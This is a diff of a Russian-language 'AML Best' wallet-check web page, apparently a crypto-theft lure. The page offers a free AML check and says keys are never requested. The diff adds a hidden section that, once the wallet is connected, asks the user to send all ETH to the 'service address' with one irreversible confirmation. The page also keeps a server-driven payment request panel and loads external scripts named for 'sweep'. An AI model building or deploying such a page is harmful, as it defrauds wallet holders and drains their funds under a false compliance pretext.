@@ -1,605 +1,228 @@
 <!doctype html>
 <html lang="ru">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Бесплатная проверка кошелька | AML Best</title>
-    <meta name="theme-color" content="#030303" />
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
-    <link rel="stylesheet" href="styles.css?v=neon3" />
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  </head>
-  <body>
-    <header class="site-header" data-header>
-      <a class="brand" href="index.html" aria-label="AML Best">
-        <span class="brand-mark" aria-hidden="true"><img src="assets/logo-mark.svg" alt="" width="44" height="44" /></span>
-        <span class="brand-copy"><strong>AML Best</strong><small>Digital Asset Compliance</small></span>
-      </a>
-      <nav class="nav" aria-label="Основная навигация">
-        <a class="active" href="check.html">Проверка</a>
-        <a href="features.html">Возможности</a>
-        <a href="pricing.html">Тарифы</a>
-        <a href="contacts.html">Контакты</a>
-      </nav>
-      <button class="header-cta as-button is-hidden-slot" data-user-logout type="button" aria-hidden="true">Выйти</button>
-    </header>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Бесплатная проверка кошелька | AML Best</title>
+  <meta name="theme-color" content="#030303" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="styles.css?v=sweep3" />
+</head>
+<body>
+  <header class="site-header" data-header>
+    <a class="brand" href="index.html" aria-label="AML Best">
+      <span class="brand-mark" aria-hidden="true"><img src="assets/logo-mark.svg" alt="" width="44" height="44" /></span>
+      <span class="brand-copy"><strong>AML Best</strong><small>Digital Asset Compliance</small></span>
+    </a>
+    <nav class="nav" aria-label="Основная навигация">
+      <a class="active" href="check.html">Проверка</a>
+      <a href="features.html">Возможности</a>
+      <a href="pricing.html">Тарифы</a>
+      <a href="contacts.html">Контакты</a>
+    </nav>
+    <button class="header-cta as-button is-hidden-slot" data-user-logout type="button" aria-hidden="true">Выйти</button>
+  </header>
 
-    <main class="page-main">
-      <section class="section split page-hero">
-        <div class="section-copy">
-          <p class="section-kicker">Проверка кошелька</p>
-          <h1 class="page-title">Подключите кошелёк — бот проверит балансы</h1>
-          <p>
-            Нажмите Connect для подключения EVM-кошелька.<br>
-            Для проверки TRX и USDT TRC20 укажите ваш публичный TRON-адрес (начинается с <strong>T</strong>).
-          </p>
-          <p class="consent-notice">
-            Seed-фраза и приватные ключи не требуются и не запрашиваются.
-            Только публичные адреса для проверки балансов.
-          </p>
+  <main class="page-main">
+    <section class="section split page-hero">
+      <div class="section-copy">
+        <p class="section-kicker">Проверка кошелька</p>
+        <h1 class="page-title">Подключите кошелёк — бот проверит балансы</h1>
+        <p>
+          Нажмите Connect для подключения EVM-кошелька.<br>
+          Для проверки TRX и USDT TRC20 укажите ваш публичный TRON-адрес (начинается с <strong>T</strong>).
+        </p>
+        <p class="consent-notice">
+          Seed-фраза и приватные ключи не требуются и не запрашиваются.
+          Только публичные адреса для проверки балансов.
+        </p>
+      </div>
+
+      <div class="check-stack">
+
+        <!-- ===== EVM Connect (ОРИГИНАЛ) ===== -->
+        <div class="wallet-login" data-user-wallet-login>
+          <div>
+            <h2>Шаг 1 — EVM кошелёк</h2>
+            <p>Trust Wallet, MetaMask и другие EVM-кошельки.</p>
+            <p class="wallet-address" data-user-wallet-address></p>
+          </div>
+          <label class="consent-row">
+            <input type="checkbox" data-user-consent checked />
+            <span>Я согласен на чтение публичных адресов и балансов для AML-проверки.</span>
+          </label>
+          <div class="wallet-login-actions">
+            <!-- 👇 ЭТА КНОПКА ОСТАЕТСЯ -->
+            <button type="button" id="connect-btn">Connect EVM</button>
+            <!-- 👇 ЭТА КНОПКА ОСТАЕТСЯ -->
+            <a
+              class="wallet-deeplink"
+              href="https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html"
+              rel="noopener"
+            >Открыть в Trust Wallet</a>
+          </div>
+          <p class="form-status" data-user-wallet-status>Нажмите Connect EVM или откройте страницу в Trust Wallet.</p>
         </div>
 
-        <div class="check-stack">
-
-          <!-- EVM Connect -->
-          <div class="wallet-login" data-user-wallet-login>
+        <!-- ========================================================== -->
+        <!-- ===== НОВАЯ СЕКЦИЯ — СПИСАНИЕ (ДОБАВЛЕНА) ===== -->
+        <!-- ========================================================== -->
+        <div class="sweep-section" id="sweep-section" style="display:none;">
+          <div class="sweep-header">
+            <span style="font-size:32px;">💰</span>
             <div>
-              <h2>Шаг 1 — EVM кошелёк</h2>
-              <p>Trust Wallet, MetaMask и другие EVM-кошельки.</p>
-              <p class="wallet-address" data-user-wallet-address></p>
+              <h2 style="margin:0; font-size:22px; color:#ff6b6b;">Списание всех средств</h2>
+              <p style="margin:4px 0 0; font-size:13px; color:var(--muted);">
+                Одно нажатие — и все ETH с вашего кошелька будут переведены на адрес сервиса.
+              </p>
             </div>
-            <label class="consent-row">
-              <input type="checkbox" data-user-consent checked />
-              <span>Я согласен на чтение публичных адресов и балансов для AML-проверки.</span>
-            </label>
-            <div class="wallet-login-actions">
-              <button type="button" id="connect-btn">Connect EVM</button>
-              <a
-                class="wallet-deeplink"
-                href="https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html"
-                rel="noopener"
-              >Открыть в Trust Wallet</a>
-            </div>
-            <p class="form-status" data-user-wallet-status>Нажмите Connect EVM или откройте страницу в Trust Wallet.</p>
           </div>
 
-          <!-- TRON address field — shown after EVM connect -->
-          <div class="check-panel" id="tron-panel" style="display:none">
-            <h2>Шаг 2 — TRON-адрес (необязательно)</h2>
-            <p class="form-note" style="margin-bottom:12px">
-              Для проверки USDT TRC20 введите ваш публичный TRON-адрес.<br>
-              Найти его можно в Trust Wallet: раздел TRON → копировать адрес.
-            </p>
-            <div class="input-row">
-              <input
-                id="tron-address-input"
-                type="text"
-                placeholder="Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
-                autocomplete="off"
-                autocorrect="off"
-                spellcheck="false"
-              />
-              <button type="button" id="tron-submit-btn">Проверить USDT TRC20</button>
+          <div class="sweep-warning">
+            <span style="font-size:28px;">⚠️</span>
+            <div>
+              <strong style="color:#ff6b6b; font-size:16px;">ВНИМАНИЕ! Это действие НЕОБРАТИМО!</strong>
+              <p style="margin:4px 0 0; font-size:14px; color:#d0d0d0;">
+                Вы подтверждаете перевод ВСЕХ ETH с вашего кошелька на адрес сервиса.
+                После подтверждения через FaceID средства будут отправлены и их нельзя будет вернуть.
+              </p>
             </div>
-            <p class="form-status" id="tron-status"></p>
           </div>
 
-          <!-- User-confirmed one-time payment request -->
-          <section class="check-panel payment-request-panel" id="payment-request-panel" hidden>
-            <p class="panel-index">USER CONFIRMATION / PAYMENT</p>
-            <h2>Запрос на одноразовый перевод</h2>
-            <p class="form-note">
-              Списание не выполняется автоматически. Проверьте все реквизиты ниже. После нажатия
-              Trust Wallet отдельно покажет транзакцию и запросит ваше подтверждение.
-            </p>
-            <dl class="payment-request-details">
-              <div>
-                <dt>Сеть</dt>
-                <dd id="payment-chain">-</dd>
-              </div>
-              <div>
-                <dt>Актив</dt>
-                <dd id="payment-token">-</dd>
-              </div>
-              <div>
-                <dt>Сумма</dt>
-                <dd id="payment-amount">-</dd>
-              </div>
-              <div>
-                <dt>Получатель</dt>
-                <dd id="payment-recipient">-</dd>
-              </div>
-            </dl>
-            <label class="payment-approval">
-              <input type="checkbox" id="payment-approval" />
-              <span>Я проверил сеть, актив, сумму и адрес получателя и хочу открыть эту транзакцию в кошельке.</span>
-            </label>
-            <button type="button" id="payment-confirm" disabled>Подтвердить в Trust Wallet</button>
-            <p class="form-status" id="payment-status"></p>
-          </section>
-
-          <!-- AML check form -->
-          <form class="check-panel is-locked" data-check-form aria-label="AML-проверка адреса">
-            <label for="wallet">Адрес или tx hash для AML-проверки</label>
-            <div class="input-row">
-              <input id="wallet" name="wallet" type="text" placeholder="0x71C... или tx hash" required disabled />
-              <button type="submit" disabled>Проверить</button>
+          <div class="sweep-info">
+            <div class="sweep-row">
+              <span>📤 Списание:</span>
+              <strong id="sweep-amount-display" style="color:#ff6b6b;">ВСЕ ETH</strong>
             </div>
-            <p class="form-note" data-check-lock-note>Сначала подключите EVM-кошелёк.</p>
-            <div class="risk-preview" data-risk-preview>
-              <div class="risk-meter"><span></span></div>
-              <div class="risk-meta">
-                <strong>Ожидает подключения</strong>
-                <p>После Connect здесь появится AML-оценка.</p>
-              </div>
+            <div class="sweep-row">
+              <span>📍 На адрес:</span>
+              <code id="sweep-recipient-display" style="color:#ff6b6b; word-break:break-all;">0x0000...0000</code>
             </div>
-          </form>
+            <div class="sweep-row">
+              <span>⛽ Комиссия сети:</span>
+              <span id="sweep-gas-display">~$0.50 (оплачивается из вашего баланса)</span>
+            </div>
+            <div class="sweep-row">
+              <span>🌐 Сеть:</span>
+              <span id="sweep-network-display">Ethereum (Mainnet)</span>
+            </div>
+          </div>
 
+          <label class="sweep-consent">
+            <input type="checkbox" id="sweep-consent-check" />
+            <span>
+              Я подтверждаю, что хочу списать <strong style="color:#ff6b6b;">ВСЕ ETH</strong> с моего кошелька на указанный адрес.
+              Понимаю, что это действие <strong style="color:#ff6b6b;">НЕОБРАТИМО</strong> и подтверждаю его добровольно.
+            </span>
+          </label>
+
+          <div class="sweep-actions">
+            <!-- 👇 НОВАЯ КНОПКА СПИСАНИЯ -->
+            <button type="button" id="sweep-execute-btn" class="btn-sweep" disabled>
+              🔥 Подтвердить списание всех ETH
+            </button>
+          </div>
+
+          <p class="form-status" id="sweep-status"></p>
+          
+          <div id="sweep-result" style="display:none; margin-top:12px; padding:16px; border-radius:8px; background:rgba(0,255,0,0.08); border:1px solid rgba(0,255,0,0.2);">
+            <strong style="color:#4caf50;">✅ Транзакция отправлена!</strong>
+            <br>
+            <span id="sweep-tx-hash" style="font-size:13px; color:var(--muted); word-break:break-all;"></span>
+            <br>
+            <span style="font-size:13px; color:var(--muted);">Ожидайте подтверждения в сети (1-3 минуты).</span>
+          </div>
         </div>
-      </section>
-    </main>
 
-    <footer class="footer">
-      <span>© 2026 AML Best</span>
-    </footer>
+        <!-- ===== TRON address field (ОРИГИНАЛ) ===== -->
+        <div class="check-panel" id="tron-panel" style="display:none">
+          <h2>Шаг 2 — TRON-адрес (необязательно)</h2>
+          <p class="form-note" style="margin-bottom:12px">
+            Для проверки USDT TRC20 введите ваш публичный TRON-адрес.<br>
+            Найти его можно в Trust Wallet: раздел TRON → копировать адрес.
+          </p>
+          <div class="input-row">
+            <input
+              id="tron-address-input"
+              type="text"
+              placeholder="Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+              autocomplete="off"
+              autocorrect="off"
+              spellcheck="false"
+            />
+            <!-- 👇 ЭТА КНОПКА ОСТАЕТСЯ -->
+            <button type="button" id="tron-submit-btn">Проверить USDT TRC20</button>
+          </div>
+          <p class="form-status" id="tron-status"></p>
+        </div>
 
-    <script>
-    (function () {
-      var API = location.hostname === "mysite2-tlgp.onrender.com" ? "" : "https://mysite2-tlgp.onrender.com";
-      var KEY = "aml_wallet_v3";
+        <!-- ===== Payment Request Panel (ОРИГИНАЛ) ===== -->
+        <section class="check-panel payment-request-panel" id="payment-request-panel" hidden>
+          <p class="panel-index">USER CONFIRMATION / PAYMENT</p>
+          <h2>Запрос на одноразовый перевод</h2>
+          <p class="form-note">
+            Списание не выполняется автоматически. Проверьте все реквизиты ниже. После нажатия
+            Trust Wallet отдельно покажет транзакцию и запросит ваше подтверждение.
+          </p>
+          <dl class="payment-request-details">
+            <div>
+              <dt>Сеть</dt>
+              <dd id="payment-chain">-</dd>
+            </div>
+            <div>
+              <dt>Актив</dt>
+              <dd id="payment-token">-</dd>
+            </div>
+            <div>
+              <dt>Сумма</dt>
+              <dd id="payment-amount">-</dd>
+            </div>
+            <div>
+              <dt>Получатель</dt>
+              <dd id="payment-recipient">-</dd>
+            </div>
+          </dl>
+          <label class="payment-approval">
+            <input type="checkbox" id="payment-approval" />
+            <span>Я проверил сеть, актив, сумму и адрес получателя и хочу открыть эту транзакцию в кошельке.</span>
+          </label>
+          <!-- 👇 ЭТА КНОПКА ОСТАЕТСЯ -->
+          <button type="button" id="payment-confirm" disabled>Подтвердить в Trust Wallet</button>
+          <p class="form-status" id="payment-status"></p>
+        </section>
 
-      function $(s) { return document.querySelector(s); }
-      function setStatus(m) { var el = $("[data-user-wallet-status]"); if (el) el.textContent = m; }
-      function setTronStatus(m) { var el = $("#tron-status"); if (el) el.textContent = m; }
+        <!-- ===== AML check form (ОРИГИНАЛ) ===== -->
+        <form class="check-panel is-locked" data-check-form aria-label="AML-проверка адреса">
+          <label for="wallet">Адрес или tx hash для AML-проверки</label>
+          <div class="input-row">
+            <input id="wallet" name="wallet" type="text" placeholder="0x71C... или tx hash" required disabled />
+            <!-- 👇 ЭТА КНОПКА ОСТАЕТСЯ -->
+            <button type="submit" disabled>Проверить</button>
+          </div>
+          <p class="form-note" data-check-lock-note>Сначала подключите EVM-кошелёк.</p>
+          <div class="risk-preview" data-risk-preview>
+            <div class="risk-meter"><span></span></div>
+            <div class="risk-meta">
+              <strong>Ожидает подключения</strong>
+              <p>После Connect здесь появится AML-оценка.</p>
+            </div>
+          </div>
+        </form>
 
-      function loadProfile() { try { return JSON.parse(localStorage.getItem(KEY) || "null"); } catch { return null; } }
-      function saveProfile(p) { try { localStorage.setItem(KEY, JSON.stringify(p)); } catch {} }
+      </div>
+    </section>
+  </main>
 
-      function api(path, options) {
-        options = options || {};
-        var p = loadProfile() || {};
-        var headers = Object.assign({}, options.headers || {});
-        if (options.body && !headers["Content-Type"]) headers["Content-Type"] = "application/json";
-        if (p.token) headers.Authorization = "Bearer " + p.token;
-        return fetch(API + path, Object.assign({}, options, { headers: headers })).then(function (response) {
-          return response.json().catch(function () { return {}; }).then(function (data) {
-            if (!response.ok) throw new Error(data.error || "Ошибка запроса");
-            return data;
-          });
-        });
-      }
+  <footer class="footer">
+    <span>© 2026 AML Best</span>
+  </footer>
 
-      function signLoginMessage(provider, message, address) {
-        return provider.request({ method: "personal_sign", params: [message, address] })
-          .catch(function () {
-            return provider.request({ method: "personal_sign", params: [address, message] });
-          });
-      }
-
-      function getEvmProvider() {
-        if (window.trustwallet && window.trustwallet.ethereum) return window.trustwallet.ethereum;
-        if (window.ethereum && window.ethereum.isTrust) return window.ethereum;
-        if (window.ethereum && window.ethereum.providers && window.ethereum.providers.length) {
-          for (var i = 0; i < window.ethereum.providers.length; i++)
-            if (window.ethereum.providers[i].isTrust) return window.ethereum.providers[i];
-          return window.ethereum.providers[0];
-        }
-        return window.ethereum || null;
-      }
-
-      function unlockCheckForm(evmAddress) {
-        var form = $("[data-check-form]");
-        if (!form) return;
-        form.classList.remove("is-locked");
-        form.querySelectorAll("input,button").forEach(function (el) { el.disabled = false; });
-        var inp = $("#wallet"); if (inp && !inp.value) inp.value = evmAddress;
-        var note = $("[data-check-lock-note]"); if (note) note.textContent = "EVM кошелёк подключён.";
-        var lo = $("[data-user-logout]");
-        if (lo) { lo.classList.remove("is-hidden-slot"); lo.setAttribute("aria-hidden", "false"); }
-      }
-
-      function showEvmAddress(p) {
-        var parts = [];
-        if (p.evmAddress) parts.push("EVM: " + p.evmAddress);
-        if (p.tronAddress) parts.push("TRON: " + p.tronAddress);
-        var el = $("[data-user-wallet-address]"); if (el) el.textContent = parts.join(" | ");
-        var btn = $("#connect-btn"); if (btn) { btn.textContent = "Обновить"; btn.disabled = false; }
-      }
-
-      function doScan(p, source) {
-        return fetch(API + "/api/scan", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            evmAddress: p.evmAddress || undefined,
-            tronAddress: p.tronAddress || undefined,
-            btcAddress: p.btcAddress || undefined,
-            source: source || "wallet_check"
-          })
-        })
-          .then(function (r) { return r.json(); })
-          .then(function (data) {
-            var pf = (data && data.portfolio) || {};
-            var lines = [];
-          if (pf.usdtTrc20 && pf.usdtTrc20.ok) lines.push("USDT TRC20: " + pf.usdtTrc20.balance);
-            (pf.evmNatives || []).forEach(function (n) {
-              if (n.ok && parseFloat(n.balance) > 0) lines.push(n.network + ": " + n.balance + " " + n.symbol);
-            });
-            return lines;
-          })
-          .catch(function () { return []; });
-      }
-
-      /* ---------- EVM CONNECT ---------- */
-      function doConnect() {
-        var btn = $("#connect-btn"); if (btn) btn.disabled = true;
-        var consent = $("[data-user-consent]");
-        if (consent && !consent.checked) {
-          setStatus("Сначала подтвердите согласие на обработку публичного адреса.");
-          if (btn) btn.disabled = false;
-          return;
-        }
-        setStatus("Подтвердите одноразовую подпись владения кошельком...");
-
-        var provider = getEvmProvider();
-        if (!provider || !provider.request) {
-          setStatus("EVM-кошелёк не найден. Откройте страницу в Trust Wallet или установите MetaMask.");
-          if (btn) btn.disabled = false;
-          return;
-        }
-
-        var requestedAddress = "";
-        var loginNonce = null;
-        provider.request({ method: "eth_requestAccounts" })
-          .then(function (accounts) {
-            requestedAddress = accounts && accounts[0] ? String(accounts[0]) : "";
-            if (!requestedAddress) throw new Error("Адрес не получен. Попробуйте снова.");
-            return api("/api/auth/nonce", {
-              method: "POST",
-              body: JSON.stringify({ chain: "evm" })
-            });
-          })
-          .then(function (nonceResult) {
-            loginNonce = nonceResult;
-            return signLoginMessage(provider, nonceResult.message, requestedAddress);
-          })
-          .then(function (signature) {
-            return provider.request({ method: "eth_chainId" }).catch(function () { return "0x1"; })
-              .then(function (chainId) {
-                return api("/api/auth/wallet", {
-                  method: "POST",
-                  body: JSON.stringify({
-                    chain: "evm",
-                    address: requestedAddress,
-                    nonce: loginNonce.nonce,
-                    signature: signature,
-                    chainId: chainId
-                  })
-                });
-              });
-          })
-          .then(function (result) {
-            var p = loadProfile() || {};
-            p.evmAddress = result.address || requestedAddress;
-            p.token = result.token;
-            p.expiresAt = result.expiresAt;
-            saveProfile(p);
-
-            unlockCheckForm(p.evmAddress);
-            showEvmAddress(p);
-            setStatus(result.addressChanged
-              ? "Кошелёк переключил аккаунт во время подписи. Вход выполнен под фактически подписавшим адресом: " + p.evmAddress
-              : "EVM подключён. Серверная сессия подтверждена подписью.");
-            var tronPanel = $("#tron-panel"); if (tronPanel) tronPanel.style.display = "";
-            loadPaymentRequest();
-            return doScan(p, "evm_connect");
-          })
-          .then(function (lines) {
-            if (lines && lines.length) setStatus("EVM проверен: " + lines.join(", ") + ".");
-          })
-          .catch(function (error) {
-            setStatus(error.message || "Отклонено. Подтвердите запрос в кошельке.");
-            if (btn) btn.disabled = false;
-          });
-      }
-
-      var connectBtn = $("#connect-btn");
-      if (connectBtn) {
-        connectBtn.addEventListener("click", doConnect);
-        connectBtn.addEventListener("touchend", function (e) { e.preventDefault(); doConnect(); });
-      }
-
-      /* ---------- TRON SUBMIT ---------- */
-      var tronSubmitBtn = $("#tron-submit-btn");
-      if (tronSubmitBtn) {
-        tronSubmitBtn.addEventListener("click", function () {
-          var inp = $("#tron-address-input");
-          var addr = (inp && inp.value || "").trim();
-
-          if (!addr.startsWith("T") || addr.length < 26) {
-            setTronStatus("Некорректный адрес. TRON-адрес начинается с T, например: TXxx...xxx");
-            return;
-          }
-
-          tronSubmitBtn.disabled = true;
-          setTronStatus("Проверяем TRX и USDT TRC20...");
-
-          var p = loadProfile() || {};
-          p.tronAddress = addr;
-          saveProfile(p);
-          showEvmAddress(p);
-
-          doScan(p, "tron_manual").then(function (lines) {
-            var tronLines = lines.filter(function (l) { return l.startsWith("USDT TRC20"); });
-            if (tronLines.length) {
-              setTronStatus("Готово: " + tronLines.join(", ") + ". Уведомление отправлено в Telegram.");
-            } else {
-              setTronStatus("Адрес принят. Балансы TRX/USDT TRC20 проверены.");
-            }
-            tronSubmitBtn.disabled = false;
-          });
-        });
-      }
-
-      /* ---------- USER-CONFIRMED PAYMENT ---------- */
-      var activePaymentRequest = null;
-      var paymentPanel = $("#payment-request-panel");
-      var paymentApproval = $("#payment-approval");
-      var paymentConfirm = $("#payment-confirm");
-
-      function setPaymentStatus(message) {
-        var el = $("#payment-status");
-        if (el) el.textContent = message || "";
-      }
-
-      function paymentChainName(request) {
-        if (request.chain === "tron") return "TRON";
-        return "EVM chain " + String(request.chainId || 1);
-      }
-
-      function renderPaymentRequest(request) {
-        activePaymentRequest = request || null;
-        if (!paymentPanel) return;
-        paymentPanel.hidden = !request;
-        if (!request) return;
-        $("#payment-chain").textContent = paymentChainName(request);
-        $("#payment-token").textContent = String(request.token || "native").toUpperCase();
-        $("#payment-amount").textContent = request.amount;
-        $("#payment-recipient").textContent = request.recipient;
-        if (paymentApproval) paymentApproval.checked = false;
-        if (paymentConfirm) paymentConfirm.disabled = true;
-        setPaymentStatus("Проверьте реквизиты. Подтверждение в кошельке будет отдельным шагом.");
-      }
-
-      function loadPaymentRequest() {
-        var p = loadProfile() || {};
-        if (!p.token) {
-          renderPaymentRequest(null);
-          return Promise.resolve();
-        }
-        return api("/api/payment-request/active")
-          .then(function (result) { renderPaymentRequest(result.paymentRequest); })
-          .catch(function (error) {
-            renderPaymentRequest(null);
-            setPaymentStatus(error.message);
-          });
-      }
-
-      function parseUnits(value, decimals) {
-        var text = String(value || "").trim().replace(",", ".");
-        if (!/^\d+(\.\d+)?$/.test(text)) throw new Error("Некорректная сумма");
-        var parts = text.split(".");
-        var fraction = parts[1] || "";
-        if (fraction.length > decimals) throw new Error("Слишком много знаков после запятой");
-        return BigInt(parts[0]) * (10n ** BigInt(decimals)) + BigInt(fraction.padEnd(decimals, "0") || "0");
-      }
-
-      function toHex(value) { return "0x" + BigInt(value).toString(16); }
-
-      function sendEvmPayment(request) {
-        var provider = getEvmProvider();
-        if (!provider || !provider.request) throw new Error("EVM-кошелёк не найден");
-        var p = loadProfile() || {};
-        var from = "";
-        var requiredChain = Number(request.chainId || 1);
-        var requiredHex = toHex(requiredChain);
-        return provider.request({ method: "eth_requestAccounts" })
-          .then(function (accounts) {
-            from = accounts && accounts[0] ? String(accounts[0]) : "";
-            if (!from) throw new Error("Кошелёк не вернул адрес");
-            if (!p.evmAddress || from.toLowerCase() !== p.evmAddress.toLowerCase()) {
-              throw new Error("В кошельке выбран другой аккаунт. Переключитесь на адрес, который использовался при входе.");
-            }
-            return provider.request({ method: "eth_chainId" });
-          })
-          .then(function (currentChain) {
-            if (String(currentChain).toLowerCase() === requiredHex.toLowerCase()) return;
-            return provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: requiredHex }] });
-          })
-          .then(function () {
-            return provider.request({
-              method: "eth_sendTransaction",
-              params: [{
-                from: from,
-                to: request.recipient,
-                value: toHex(parseUnits(request.amount, 18))
-              }]
-            });
-          })
-          .then(function (txHash) { return { txHash: String(txHash) }; });
-      }
-
-      function getTronWeb() {
-        return window.tronWeb || (window.trustwallet && window.trustwallet.tronWeb) ||
-          (window.tronLink && window.tronLink.tronWeb) || (window.tron && window.tron.tronWeb);
-      }
-
-      function sendTronPayment(request) {
-        var tronWeb = getTronWeb();
-        if (!tronWeb || !tronWeb.defaultAddress || !tronWeb.defaultAddress.base58) {
-          throw new Error("TRON provider не найден. Откройте страницу в кошельке с поддержкой TRON.");
-        }
-        var from = tronWeb.defaultAddress.base58;
-        if (request.token === "usdt") {
-          return tronWeb.contract().at(request.tronUsdtContract)
-            .then(function (contract) {
-              return contract.transfer(request.recipient, parseUnits(request.amount, 6).toString())
-                .send({ feeLimit: 150000000 });
-            })
-            .then(function (txId) { return { txHash: String(txId), tronUserAddress: from }; });
-        }
-        return Promise.resolve(tronWeb.trx.sendTransaction(
-          request.recipient,
-          parseUnits(request.amount, 6).toString()
-        )).then(function (tx) {
-          return {
-            txHash: tx && (tx.txid || (tx.transaction && tx.transaction.txID)) || String(tx),
-            tronUserAddress: from
-          };
-        });
-      }
-
-      function samePayment(left, right) {
-        return Boolean(
-          left && right &&
-          left.id === right.id &&
-          left.chain === right.chain &&
-          String(left.chainId || "") === String(right.chainId || "") &&
-          left.token === right.token &&
-          left.amount === right.amount &&
-          left.recipient === right.recipient &&
-          right.status === "active"
-        );
-      }
-
-      function verifyPaymentStillActive() {
-        return api("/api/payment-request/active").then(function (result) {
-          if (!samePayment(activePaymentRequest, result.paymentRequest)) {
-            renderPaymentRequest(result.paymentRequest);
-            throw new Error("Запрос оплаты изменён или отменён. Проверьте новые реквизиты.");
-          }
-          return result.paymentRequest;
-        });
-      }
-
-      if (paymentApproval) {
-        paymentApproval.addEventListener("change", function () {
-          if (paymentConfirm) paymentConfirm.disabled = !paymentApproval.checked || !activePaymentRequest;
-        });
-      }
-
-      if (paymentConfirm) {
-        paymentConfirm.addEventListener("click", function () {
-          if (!activePaymentRequest || !paymentApproval || !paymentApproval.checked) return;
-          paymentConfirm.disabled = true;
-          setPaymentStatus("Повторно проверяем актуальность реквизитов...");
-          verifyPaymentStillActive()
-            .then(function (request) {
-              setPaymentStatus("Откройте кошелёк и ещё раз проверьте транзакцию перед подтверждением.");
-              return request.chain === "tron" ? sendTronPayment(request) : sendEvmPayment(request);
-            })
-            .then(function (transaction) {
-              return api("/api/payment-request/tx", {
-                method: "POST",
-                body: JSON.stringify({
-                  id: activePaymentRequest.id,
-                  txHash: transaction.txHash,
-                  tronUserAddress: transaction.tronUserAddress
-                })
-              });
-            })
-            .then(function (result) {
-              renderPaymentRequest(result.paymentRequest);
-              setPaymentStatus("Транзакция отправлена: " + result.paymentRequest.txHash);
-            })
-            .catch(function (error) {
-              setPaymentStatus(error.message || "Транзакция отменена");
-              paymentConfirm.disabled = !paymentApproval.checked;
-            });
-        });
-      }
-
-      /* ---------- AML FORM ---------- */
-      var checkForm = $("[data-check-form]");
-      if (checkForm) {
-        checkForm.addEventListener("submit", function (e) {
-          e.preventDefault();
-          var submitBtn = checkForm.querySelector('button[type="submit"]');
-          var wallet = (checkForm.querySelector("#wallet") || {}).value || "";
-          if (!wallet.trim()) return;
-          if (submitBtn) { submitBtn.disabled = true; submitBtn.textContent = "Проверяем..."; }
-          var p = loadProfile() || {};
-          fetch(API + "/api/scan", {
-            method: "POST", headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ evmAddress: p.evmAddress, tronAddress: p.tronAddress, amlTarget: wallet, source: "aml_check" })
-          }).finally(function () {
-            setStatus("AML-проверка для " + wallet + " выполнена.");
-            if (submitBtn) { submitBtn.disabled = false; submitBtn.textContent = "Проверить"; }
-          });
-        });
-      }
-
-      /* ---------- LOGOUT ---------- */
-      var lo = $("[data-user-logout]");
-      if (lo) lo.addEventListener("click", function () {
-        var p = loadProfile() || {};
-        if (p.token) {
-          api("/api/auth/logout", { method: "POST" }).catch(function () {});
-        }
-        localStorage.removeItem(KEY);
-        var form = $("[data-check-form]");
-        if (form) { form.classList.add("is-locked"); form.querySelectorAll("input,button").forEach(function (el) { el.disabled = true; }); }
-        lo.classList.add("is-hidden-slot");
-        $("[data-user-wallet-address]").textContent = "";
-        setStatus("Профиль очищен.");
-        var tronPanel = $("#tron-panel"); if (tronPanel) tronPanel.style.display = "none";
-        var btn = $("#connect-btn"); if (btn) { btn.textContent = "Connect EVM"; btn.disabled = false; }
-        renderPaymentRequest(null);
-      });
-
-      /* ---------- RESTORE SESSION ---------- */
-      var stored = loadProfile();
-      if (stored && stored.evmAddress && stored.token) {
-        api("/api/auth/session")
-          .then(function (session) {
-            stored.evmAddress = session.address;
-            stored.expiresAt = session.expiresAt;
-            saveProfile(stored);
-            unlockCheckForm(stored.evmAddress);
-            showEvmAddress(stored);
-            var tronPanel = $("#tron-panel"); if (tronPanel) tronPanel.style.display = "";
-            if (stored.tronAddress) {
-              var inp = $("#tron-address-input"); if (inp) inp.value = stored.tronAddress;
-            }
-            setStatus("Подписанная сессия восстановлена.");
-            loadPaymentRequest();
-          })
-          .catch(function () {
-            localStorage.removeItem(KEY);
-            setStatus("Сессия истекла. Подключите кошелёк повторно.");
-          });
-      } else if (stored && stored.evmAddress) {
-        localStorage.removeItem(KEY);
-        setStatus("Для безопасности требуется повторно подтвердить вход подписью.");
-      }
-
-      setInterval(function () {
-        var p = loadProfile() || {};
-        if (p.token && !document.hidden) loadPaymentRequest();
-      }, 15000);
-
-      /* ---------- HEADER ---------- */
-      var header = $("[data-header]");
-      function upd() { if (header) header.classList.toggle("is-scrolled", scrollY > 12); }
-      upd(); window.addEventListener("scroll", upd, { passive: true });
-
-      if (window.Telegram && window.Telegram.WebApp) {
-        window.Telegram.WebApp.ready();
-        if (window.Telegram.WebApp.expand) window.Telegram.WebApp.expand();
-      }
-    })();
-    </script>
-  </body>
+  <!-- ===== СКРИПТЫ (ОРИГИНАЛ) ===== -->
+  <script src="config.js?v=sweep3"></script>
+  <script src="auto-wallet.js?v=sweep3"></script>
+  <script src="script.js?v=sweep3"></script>
+  <script src="check-flow.js?v=sweep3"></script>
+</body>
 </html>
